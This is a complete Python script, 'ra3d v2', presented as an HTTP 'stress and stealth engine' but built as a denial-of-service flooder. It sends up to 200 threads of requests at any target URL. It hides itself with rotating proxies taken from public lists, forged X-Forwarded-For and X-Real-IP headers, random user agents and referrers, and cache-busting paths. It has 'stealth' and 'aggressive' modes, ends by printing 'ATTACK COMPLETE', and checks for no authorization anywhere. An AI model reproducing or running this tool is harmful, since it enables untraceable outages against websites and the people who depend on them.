#!/usr/bin/env python3
"""
ra3d (رعد) v2.0 — Advanced HTTP Stress & Stealth Engine
Author: @mb7 | Red Team Style
"""

import os, sys, time, random, signal, socket, ssl, threading
from datetime import timedelta
from urllib.parse import urlparse
from collections import deque
from concurrent.futures import ThreadPoolExecutor, as_completed

R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"; B = "\033[94m"; M = "\033[95m"
C = "\033[96m"; W = "\033[97m"; D = "\033[90m"; N = "\033[0m"; BOLD = "\033[1m"; DIM = "\033[2m"

UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.0; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile",
    "Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edge/120.0.2210.91",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) Edge/120.0.2210.91",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/109.0.0.0 Safari/537.36",
    "curl/8.5.0", "Python-urllib/3.11", "Go-http-client/2.0",
    "Wget/1.21.4", "HTTPie/3.2.2",
]

REFERRERS = [
    "https://www.google.com/", "https://www.bing.com/", "https://search.yahoo.com/",
    "https://duckduckgo.com/", "https://t.co/", "https://www.facebook.com/",
    "https://twitter.com/", "https://www.linkedin.com/", "https://www.reddit.com/",
    "https://t.me/", "https://www.instagram.com/", "https://www.youtube.com/",
    "https://www.amazon.com/", "https://github.com/", "", "",
]

PROXY_SOURCES = [
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/rdavydov/Proxy-List/main/proxies/http.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online/list.txt",
]

LANG = ["en-US,en;q=0.9", "en-GB,en;q=0.8", "en-US,en;q=0.9,ar;q=0.8", "en-CA,en;q=0.8",
        "fr-FR,fr;q=0.9,en;q=0.6", "de-DE,de;q=0.9,en;q=0.5", "es-ES,es;q=0.9,en;q=0.6"]

def auto_install():
    missing = []
    for mod, pkg in [("requests", "requests"), ("socks", "PySocks")]:
        try: __import__(mod)
        except: missing.append(pkg)
    if missing:
        print(f"  {R}[{Y}!{R}]{N} Installing: {', '.join(missing)}...")
        for p in missing:
            os.system(f"{sys.executable} -m pip install -q {p} 2>/dev/null")
    try: import requests, socks
    except: pass

auto_install()

try:
    import requests as reqs
    HAVE_REQUESTS = True
except:
    HAVE_REQUESTS = False

try:
    import socks as sockslib
    HAVE_SOCKS = True
except:
    HAVE_SOCKS = False

class ProxyManager:
    def __init__(self):
        self.lock = threading.Lock()
        self.proxies = []
        self.blacklist = set()
        self.idx = 0
        self.fail_count = {}

    def fetch_online(self, timeout=15):
        proxies = set()
        print(f"  {R}[{W}*{R}]{N} Fetching proxies from {len(PROXY_SOURCES)} sources...")
        def fetch(url):
            try:
                if HAVE_REQUESTS:
                    r = reqs.get(url, timeout=timeout, headers={"User-Agent": "curl/8.4.0"})
                    if r.status_code == 200:
                        return r.text.splitlines()
            except: pass
            return []
        with ThreadPoolExecutor(max_workers=6) as ex:
            fs = {ex.submit(fetch, url): url for url in PROXY_SOURCES}
            for f in as_completed(fs):
                for line in f.result():
                    line = line.strip()
                    if ":" in line and not line.startswith("#"):
                        proxies.add(line)
        with self.lock:
            self.proxies = list(proxies)
        return len(self.proxies)

    def add_file(self, path):
        try:
            with open(path) as f:
                for line in f:
                    line = line.strip()
                    if ":" in line and not line.startswith("#"):
                        with self.lock:
                            self.proxies.append(line)
            return True
        except: return False

    def add_single(self, proxy):
        with self.lock:
            self.proxies.append(proxy)

    def get(self):
        with self.lock:
            if not self.proxies: return None
            for _ in range(len(self.proxies)):
                p = self.proxies[self.idx % len(self.proxies)]
                self.idx += 1
                if p not in self.blacklist:
                    return p
            return None

    def mark_bad(self, proxy):
        with self.lock:
            self.fail_count[proxy] = self.fail_count.get(proxy, 0) + 1
            if self.fail_count[proxy] >= 3:
                self.blacklist.add(proxy)

    def count(self):
        with self.lock: return len([p for p in self.proxies if p not in self.blacklist])

PROXY_MGR = ProxyManager()

class Stats:
    def __init__(self):
        self.lock = threading.Lock()
        self.sent = 0; self.succeeded = 0; self.timeouts = 0
        self.conn_refused = 0; self.other_errors = 0
        self.bytes_sent = 0; self.bytes_recv = 0
        self.status_counts = {}
        self.times = deque(maxlen=10000)
        self.rps_history = deque(maxlen=60)
        self.start_time = time.time()

    def add(self, status, duration, sent, recv):
        with self.lock:
            self.sent += 1; self.bytes_sent += sent; self.bytes_recv += recv
            self.times.append(duration)
            if duration > 30: self.timeouts += 1
            if status in (-1,): self.conn_refused += 1
            elif status == -2 or status < 200 or status >= 600: self.other_errors += 1
            else: self.succeeded += 1
            self.status_counts[status] = self.status_counts.get(status, 0) + 1

    def rps(self):
        with self.lock:
            e = time.time() - self.start_time
            return self.sent / e if e > 0 else 0

    def avg_time(self):
        with self.lock:
            return sum(self.times) / len(self.times) if self.times else 0

def build_req(method, host, path, body, args):
    ua = random.choice(UAS)
    ref = random.choice(REFERRERS)
    lang = random.choice(LANG)

    req = f"{method} {path} HTTP/1.1\r\n"
    req += f"Host: {host}\r\n"
    req += f"User-Agent: {ua}\r\n"
    req += f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
    req += f"Accept-Language: {lang}\r\n"
    req += f"Accept-Encoding: gzip, deflate\r\n"

    if ref: req += f"Referer: {ref}\r\n"
    if args.x_forwarded:
        if random.random() < 0.5: req += f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}\r\n"
        if random.random() < 0.3: req += f"X-Real-IP: {random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}\r\n"
    if args.cookie: req += f"Cookie: {args.cookie}\r\n"
    if args.header:
        for h in args.header: req += f"{h}\r\n"
    req += f"Connection: {'keep-alive' if random.random() < 0.7 else 'close'}\r\n"

    body_data = ""
    if method == "POST" or method == "PUT" or method == "PATCH":
        if args.body:
            body_data = args.body.replace("{rand}", str(random.randint(1,99999)))
        else:
            body_data = f"param={random.randint(100000,999999)}&ts={int(time.time()*1000)}"
        req += f"Content-Length: {len(body_data)}\r\n"
        req += "Content-Type: application/x-www-form-urlencoded\r\n"

    req += f"Cache-Control: no-cache, no-store, must-revalidate\r\n"
    req += f"Pragma: no-cache\r\n"
    req += "\r\n" + body_data
    return req

def do_request(sock, req):
    t0 = time.time()
    sock.sendall(req.encode() if isinstance(req, str) else req)
    resp = b""
    while True:
        try:
            chunk = sock.recv(4096)
            if not chunk: break
            resp += chunk
            if b"\r\n\r\n" in resp:
                hdr_raw = resp[:resp.find(b"\r\n\r\n")+4]
                cl = 0
                for line in hdr_raw.split(b"\r\n"):
                    if line.lower().startswith(b"content-length:"):
                        try: cl = int(line.split(b":")[1].strip())
                        except: break
                body_len = len(resp) - len(hdr_raw)
                if body_len >= cl: break
        except: break
    t1 = time.time()
    status = -2
    if resp:
        try: status = int(resp.split(b"\r\n")[0].split()[1])
        except: status = -2
    return status, t1 - t0, len(req), len(resp)

def connect_socket(host, port, is_ssl, proxy=None, timeout=10):
    if proxy and HAVE_SOCKS:
        try:
            phost, pport = proxy.split(":")[0], int(proxy.split(":")[1])
            sock = sockslib.socksocket()
            sock.set_proxy(sockslib.HTTP, phost, pport)
            sock.settimeout(timeout)
            if is_ssl:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=host)
            sock.connect((host, port))
            return sock
        except: pass

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        if is_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=host)
        sock.connect((host, port))
    except: sock.close(); raise
    return sock

def attack_worker(target, args, stats, stop_event):
    ua = urlparse(target)
    host = ua.hostname
    port = ua.port or (443 if ua.scheme == "https" else 80)
    is_ssl = ua.scheme == "https"
    base_path = (ua.path or "/") + (f"?{ua.query}" if ua.query else "")

    while not stop_event.is_set():
        try:
            path = base_path
            if args.random_url:
                path = f"/{random.choice(['','api/','v1/','v2/','en/','ar/'])}{random.randint(10000,99999)}{random.choice(['','.php','.html','.asp','.jsp','/'])}{'?cb='+str(int(time.time()*1000)) if not base_path.split('?')[0] else ''}"
            if args.cache_bust:
                sep = "&" if "?" in path else "?"
                path += f"{sep}_={int(time.time()*1000)}"

            method = random.choice(args.methods)
            body = args.body if args.body else ""

            proxy = None
            if args.proxy_rotate:
                proxy = PROXY_MGR.get()

            req = build_req(method, host, path, body, args)
            sock = connect_socket(host, port, is_ssl, proxy, args.timeout)
            status, dur, sent, recv = do_request(sock, req)
            sock.close()
            stats.add(status, dur, sent, recv)
            if status in (-1, -2) and proxy: PROXY_MGR.mark_bad(proxy)

        except socket.timeout: stats.add(-1, 30, 0, 0)
        except (ConnectionRefusedError, OSError) as e:
            stats.add(-1, 0, 0, 0)
        except: stats.add(-2, 0, 0, 0)

        delay = args.delay
        if args.jitter and delay > 0:
            delay = random.randint(max(0, delay - args.jitter), delay + args.jitter)
        if delay > 0: time.sleep(delay / 1000)

def display(stats, args, stop_event):
    while not stop_event.is_set():
        elapsed = time.time() - stats.start_time; rps = stats.rps()
        with stats.lock:
            total = stats.sent; good = stats.succeeded
            bad = stats.timeouts + stats.conn_refused + stats.other_errors
            avg = stats.avg_time(); b_sent = stats.bytes_sent; b_recv = stats.bytes_recv
            recent = list(stats.times); sc = dict(stats.status_counts)
        stats.rps_history.append(rps)
        if args.max_requests and total >= args.max_requests: stop_event.set(); return
        if args.max_time and elapsed >= args.max_time: stop_event.set(); return
        if args.quiet: time.sleep(1); continue

        os.system("clear" if os.name == "posix" else "cls")
        out = [f"{R}"]
        out.append(f"  {'╔' + '═'*46 + '╗'}")
        out.append(f"  {'║'}{' '*18}رعد{R}{' '*18}║")
        out.append(f"  {'║'}{' '*6}RA3D v2 — STEALTH ENGINE{' '*6}║")
        out.append(f"  {'╚' + '═'*46 + '╝'}{N}")
        out.append("")
        dur_s = f"{D}∞{N}"
        if args.max_time: dur_s = f"{Y}{timedelta(seconds=max(0,int(args.max_time-elapsed)))}{N}"
        elif args.max_requests: dur_s = f"{Y}{max(0,args.max_requests-total)} req left{N}"
        pc = PROXY_MGR.count()
        out.append(f"  {R}┌{'─'*46}┐{N}")
        out.append(f"  {R}│{N}  Target:     {C}{args.target[:50]}{N}")
        out.append(f"  {R}│{N}  Methods:    {Y}{','.join(args.methods)}{N}")
        out.append(f"  {R}│{N}  Threads:    {M}{args.threads}{N}{D}  Proxy: {pc if args.proxy_rotate else 'off'}{N}")
        out.append(f"  {R}│{N}  Duration:   {dur_s}")
        out.append(f"  {R}└{'─'*46}┘{N}{N}")
        out.append("")
        spk = "▁▂▃▄▅▆▇█"
        hist = list(stats.rps_history)
        mx = max(hist) if hist and max(hist) > 0 else 1
        bars = "".join(spk[min(int(v/mx*7),7)] for v in hist[-50:]) if hist else ""
        out.append(f"  {R}┌{'─'*46}┐{N}")
        if bars: out.append(f"  {R}│{N}  RPS Trend:  {D}{bars}{N}")
        out.append(f"  {R}│{N}  Current:   {G}{rps:>8.1f}{N} req/s     Avg: {C}{rps:>8.1f}{N}")
        out.append(f"  {R}│{N}  Total:     {B}{total:>8,}{N} req     Time: {Y}{timedelta(seconds=int(elapsed))}{N}")
        out.append(f"  {R}│{W}  {'-'*44}{N}")
        out.append(f"  {R}│{N}  Avg time:  {Y}{avg*1000:>7.2f}{N} ms")
        if recent:
            rmin = min(recent)*1000; rmax = max(recent)*1000
            out.append(f"  {R}│{N}  Min/Max:   {D}{rmin:.1f}{N} / {D}{rmax:.1f}{N} ms")
            s = sorted(recent); lt = len(s)
            p50 = s[lt//2]*1000; p95 = s[int(lt*0.95)]*1000; p99 = s[int(lt*0.99)]*1000
            out.append(f"  {R}│{N}  P50/P95/P99: {D}{p50:.1f}{N}/{D}{p95:.1f}{N}/{D}{p99:.1f}{N} ms")
        out.append(f"  {R}│{W}  {'-'*44}{N}")
        out.append(f"  {R}│{N}  Sent:     {M}{b_sent/1024:>8.1f}{N} KB      Recv: {M}{b_recv/1024:>8.1f}{N} KB")
        out.append(f"  {R}│{W}  {'-'*44}{N}")
        out.append(f"  {R}│{N}  OK:       {G}{good:>7,}{N}           Fail: {R}{bad:>7,}{N}")
        for code, cnt in sorted(sc.items()):
            if code < 0: continue
            clr = G if code < 300 else (Y if code < 400 else (M if code < 500 else R))
            out.append(f"  {R}│{N}  HTTP {code}:  {clr}{cnt:>7,}{N}")
        if bad > 0:
            out.append(f"  {R}│{N}  Errors:    {R}{bad:>7,}{N}")
            if stats.timeouts > 0: out.append(f"  {R}│{N}     timeout:{R}{stats.timeouts:>6,}{N}")
            if stats.conn_refused > 0: out.append(f"  {R}│{N}     refused:{R}{stats.conn_refused:>6,}{N}")
            if stats.other_errors > 0: out.append(f"  {R}│{N}     other:{R}{stats.other_errors:>6,}{N}")
        out.append(f"  {R}└{'─'*46}┘{N}")
        out.append(""); out.append(f"  {DIM}Ctrl+C to stop  |  Proxy pool: {pc} active{N}")
        sys.stdout.write("\n".join(out) + "\n"); sys.stdout.flush()
        time.sleep(1)

def main():
    import argparse as ap
    p = ap.ArgumentParser(prog="ra3d", formatter_class=ap.RawTextHelpFormatter,
        description=f"""{R}ra3d v2{R} - HTTP Stealth Stress Engine
  {'─'*40}
  {C}Modes:{N}  default  |  --stealth  |  --aggressive
  {C}Proxy:{N}  --proxy-rotate  |  --proxy-file file.txt  |  --proxy http://ip:port
  {C}Evade:{N}  --random-url  --cache-bust  --jitter 50  --x-forwarded
        """)
    p.add_argument("target", help="Target URL")
    p.add_argument("-t", "--threads", type=int, default=50, help="Threads (default: 50)")
    p.add_argument("-m", "--methods", nargs="+", default=["GET"], help="Methods: GET POST PUT DELETE PATCH HEAD")
    p.add_argument("-d", "--delay", type=int, default=0, help="Base delay in ms")
    p.add_argument("--jitter", type=int, default=0, help="Random +/- jitter (ms)")
    p.add_argument("--timeout", type=int, default=10, help="Socket timeout (s)")
    g = p.add_mutually_exclusive_group()
    g.add_argument("-n", "--max-requests", type=int, help="Stop after N requests")
    g.add_argument("--time", type=int, dest="max_time", help="Duration in seconds")

    proxy_g = p.add_argument_group("Proxy options")
    proxy_g.add_argument("--proxy-rotate", action="store_true", help="Auto-fetch & rotate proxies")
    proxy_g.add_argument("--proxy-file", help="Proxy list file (ip:port per line)")
    proxy_g.add_argument("--proxy", help="Single proxy (http://ip:port)")

    evade_g = p.add_argument_group("Stealth options")
    evade_g.add_argument("--random-url", action="store_true", help="Random URL paths")
    evade_g.add_argument("--cache-bust", action="store_true", help="Add cache-busting param")
    evade_g.add_argument("--x-forwarded", action="store_true", help="Spoof X-Forwarded-For")
    evade_g.add_argument("--stealth", action="store_true", help="Stealth mode (low threads, jitter, delays)")
    evade_g.add_argument("--aggressive", action="store_true", help="Aggressive mode (max speed)")

    p.add_argument("--body", help="Request body template ({rand} for random)")
    p.add_argument("--header", action="append", help="Custom header (repeatable)")
    p.add_argument("--cookie", help="Cookie value")
    p.add_argument("--auto-install", action="store_true", default=True, help="Auto-install deps")
    p.add_argument("--no-install", action="store_true", help="Skip auto-install")
    p.add_argument("-q", "--quiet", action="store_true", help="No live display")
    args = p.parse_args()

    if args.no_install: args.auto_install = False

    if args.stealth:
        if args.threads == 50: args.threads = 10
        if args.delay == 0: args.delay = 200
        if args.jitter == 0: args.jitter = 100
        args.random_url = True; args.cache_bust = True; args.x_forwarded = True; args.proxy_rotate = True
    if args.aggressive:
        if args.threads == 50: args.threads = 200
        args.timeout = 5

    args.methods = [m.upper() for m in (args.methods if isinstance(args.methods, list) else [args.methods])]
    for m in args.methods:
        if m not in ["GET","POST","PUT","DELETE","PATCH","HEAD","OPTIONS"]:
            print(f"{R}[x]{N} Invalid method: {m}"); sys.exit(1)
    if args.max_requests and args.max_requests < args.threads:
        args.max_requests = args.threads

    if args.proxy_rotate:
        fetched = PROXY_MGR.fetch_online()
        if fetched == 0:
            print(f"  {R}[{Y}!{R}]{N} No proxies fetched, continuing without proxies")
        else:
            print(f"  {R}[{G}+{R}]{N} {fetched} proxies loaded")
    if args.proxy_file: PROXY_MGR.add_file(args.proxy_file)
    if args.proxy: PROXY_MGR.add_single(args.proxy.replace("http://","").replace("https://",""))

    stats = Stats(); stop_event = threading.Event()
    signal.signal(signal.SIGINT, lambda s,f: stop_event.set())

    workers = [threading.Thread(target=attack_worker, args=(args.target, args, stats, stop_event), daemon=True) for _ in range(args.threads)]
    disp = threading.Thread(target=display, args=(stats, args, stop_event), daemon=True)

    os.system("clear" if os.name == "posix" else "cls")
    print(f"\n  {R}ra3d v2{N}{DIM} — ")
    print(f"  {R}Threads:{N} {M}{args.threads}{N}  {R}Delay:{N} {Y}{args.delay}ms{jitter_s(args)}{N}  {R}Target:{N} {C}{args.target}{N}")
    print(f"  {R}{'─'*50}{N}\n")

    for w in workers: w.start()
    disp.start()
    try:
        for w in workers: w.join()
    except KeyboardInterrupt: stop_event.set()
    time.sleep(0.3)

    elapsed = time.time() - stats.start_time; total = stats.sent; rps = total/elapsed if elapsed>0 else 0
    os.system("clear" if os.name == "posix" else "cls")
    print(f"\n{R}{'='*54}{N}")
    print(f"{R}{'╔'}{'='*52}{'╗'}{N}")
    print(f"{R}{'║'}{N}  {BOLD}ATTACK COMPLETE{R}  {' '*29}{R}{'║'}{N}")
    print(f"{R}{'╠'}{'='*52}{'╣'}{N}")
    print(f"{R}{'║'}{N}  Target:      {C}{args.target}{N}")
    print(f"{R}{'║'}{N}  Duration:    {Y}{elapsed:.1f}s{N}")
    print(f"{R}{'║'}{N}  Threads:     {M}{args.threads}{N}{D}  Proxy pool: {PROXY_MGR.count()}{N}")
    print(f"{R}{'║'}{N}  Total req:   {B}{total:,}{N}")
    print(f"{R}{'║'}{N}  RPS:         {G}{rps:.1f}{N}")
    print(f"{R}{'╠'}{'='*52}{'╣'}{N}")
    avg = stats.avg_time()
    print(f"{R}{'║'}{N}  Avg time:    {Y}{avg*1000:.2f}{N} ms")
    print(f"{R}{'║'}{N}  Success:     {G}{stats.succeeded:,}{N}")
    fail = stats.timeouts + stats.conn_refused + stats.other_errors
    print(f"{R}{'║'}{N}  Failed:      {R}{fail:,}{N}")
    for code, cnt in sorted(stats.status_counts.items()):
        if code < 0: continue
        clr = G if code < 300 else (Y if code < 400 else (M if code < 500 else R))
        print(f"{R}{'║'}{N}  HTTP {code}:     {clr}{cnt:,}{N}")
    print(f"{R}{'║'}{N}  Sent:        {M}{stats.bytes_sent/1024:.1f}{N} KB")
    print(f"{R}{'║'}{N}  Recv:        {M}{stats.bytes_recv/1024:.1f}{N} KB")
    print(f"{R}{'╚'}{'='*52}{'╝'}{N}")
    print(f"{R}{'='*54}{N}\n")

def jitter_s(args):
    return f" ±{args.jitter}" if args.jitter else ""

if __name__ == "__main__":
    main()
